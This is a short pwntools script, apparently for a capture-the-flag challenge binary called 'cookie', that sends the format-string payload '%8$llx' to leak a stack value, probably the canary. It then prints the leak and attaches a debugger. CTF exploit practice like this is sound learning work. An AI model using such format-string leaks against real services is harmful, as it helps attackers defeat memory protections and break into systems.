from pwn import *

e = ELF("./cookie")

context.binary = e.path

if "--remote" in sys.argv:
  p = remote("ctf.umbccd.io", 4200)
else:
  p = process(e.path)


p.sendlineafter("?", "%8$llx")

p.recvuntil("Hello, ")
leak = int(p.recvline(), 16)

print(hex(leak))

gdb.attach(p)

p.interactive()
